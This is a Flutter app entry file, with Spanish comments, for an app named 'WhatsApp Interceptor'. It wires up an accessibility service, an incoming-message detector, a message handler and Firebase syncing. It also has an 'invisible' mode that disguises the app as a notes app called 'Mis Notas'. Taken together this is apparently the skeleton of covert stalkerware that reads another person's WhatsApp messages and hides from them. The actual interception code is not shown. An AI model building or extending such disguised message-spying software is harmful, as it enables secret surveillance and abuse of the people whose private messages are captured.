import 'package:flutter/material.dart';
import 'package:whatsapp_interceptor/screens/home_screen.dart';
import 'package:whatsapp_interceptor/screens/activation_screen.dart';
import 'package:whatsapp_interceptor/services/accessibility_service.dart';
import 'package:whatsapp_interceptor/services/incoming_message_detector.dart';
import 'package:whatsapp_interceptor/services/message_handler.dart';
import 'package:whatsapp_interceptor/services/auth_service.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:whatsapp_interceptor/services/firebase_message_service.dart';
import 'package:whatsapp_interceptor/utils/logger.dart';
import 'package:whatsapp_interceptor/services/app_visibility_service.dart';
import 'package:whatsapp_interceptor/screens/notes_app_screen.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Iniciar servicios
  try {
    // Inicializar Firebase primero
    await Firebase.initializeApp();
    logger.d('Main', 'Firebase inicializado correctamente');

    // Inicializar servicio de autenticación
    await authService.init();
    logger.d('Main', 'Servicio de autenticación inicializado');

    // Inicializar servicio de Firebase
    final firebaseInitialized = await firebaseMessageService.init();
    logger.d('Main', 'Servicio de Firebase inicializado: $firebaseInitialized');

    // Iniciar refresco periódico para actualizaciones más frecuentes
    if (firebaseInitialized) {
      firebaseMessageService.startPeriodicRefresh();
      logger.d('Main', 'Refresco periódico de Firebase iniciado');
    }

    // Inicializar servicio de visibilidad
    await appVisibilityService.init();
    logger.d('Main', 'Servicio de visibilidad inicializado');

    // Inicializar servicios base
    await accessibilityService.init();
    await incomingMessageDetector.init();

    // Inicializar manejador centralizado de mensajes que usa los servicios anteriores
    await messageHandler.init();

    logger.d('Main', 'Servicios inicializados correctamente');
  } catch (e) {
    logger.e('Main', 'Error al inicializar servicios', e);
  }

  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  bool _isAuthenticated = false;
  bool _isLoading = true;
  bool _isInvisible = false;

  @override
  void initState() {
    super.initState();
    _checkAuth();

    // Escuchar cambios en el estado de autenticación
    authService.authStateStream.listen((isAuthenticated) {
      if (mounted) {
        setState(() {
          _isAuthenticated = isAuthenticated;
        });
      }
    });

    // Escuchar cambios en el estado de visibilidad
    appVisibilityService.visibilityStream.listen((isInvisible) {
      if (mounted) {
        setState(() {
          _isInvisible = isInvisible;
        });
      }
    });
  }

  Future<void> _checkAuth() async {
    final isAuth = await authService.checkAuthentication();
    final isInvisible = appVisibilityService.isInvisible;

    if (mounted) {
      setState(() {
        _isAuthenticated = isAuth;
        _isInvisible = isInvisible;
        _isLoading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: _isInvisible ? 'Mis Notas' : 'WhatsApp Interceptor',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        brightness: _isInvisible ? Brightness.light : Brightness.dark,
        scaffoldBackgroundColor: _isInvisible ? Colors.white : Colors.black,
        appBarTheme: AppBarTheme(
          backgroundColor: _isInvisible ? Colors.blue.shade700 : const Color(0xFF075E54),
        ),
        cardTheme: CardThemeData(
          color: _isInvisible ? Colors.white : const Color(0xFF1D1D1D),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(8),
          ),
        ),
        colorScheme: _isInvisible
            ? ColorScheme.light(
                primary: Colors.blue.shade700,
                secondary: Colors.blueAccent,
              )
            : const ColorScheme.dark(
                primary: Color(0xFF128C7E),
                secondary: Color(0xFF25D366),
              ),
      ),
      themeMode: _isInvisible ? ThemeMode.light : ThemeMode.dark,
      home: _buildHomeScreen(),
      routes: {
        '/notes': (context) => const NotesAppScreen(),
      },
      debugShowCheckedModeBanner: false,
    );
  }

  Widget _buildHomeScreen() {
    if (_isLoading) {
      return const SplashScreen();
    }

    if (!_isAuthenticated) {
      return const ActivationScreen();
    }

    return _isInvisible ? const NotesAppScreen() : const HomeScreen();
  }

  @override
  void dispose() {
    authService.dispose();
    appVisibilityService.dispose();
    super.dispose();
  }
}

class SplashScreen extends StatelessWidget {
  const SplashScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return const Scaffold(
      backgroundColor: Colors.black,
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(
              Icons.message,
              color: Color(0xFF128C7E),
              size: 80,
            ),
            SizedBox(height: 24),
            CircularProgressIndicator(
              valueColor: AlwaysStoppedAnimation<Color>(Color(0xFF128C7E)),
            ),
          ],
        ),
      ),
    );
  }
}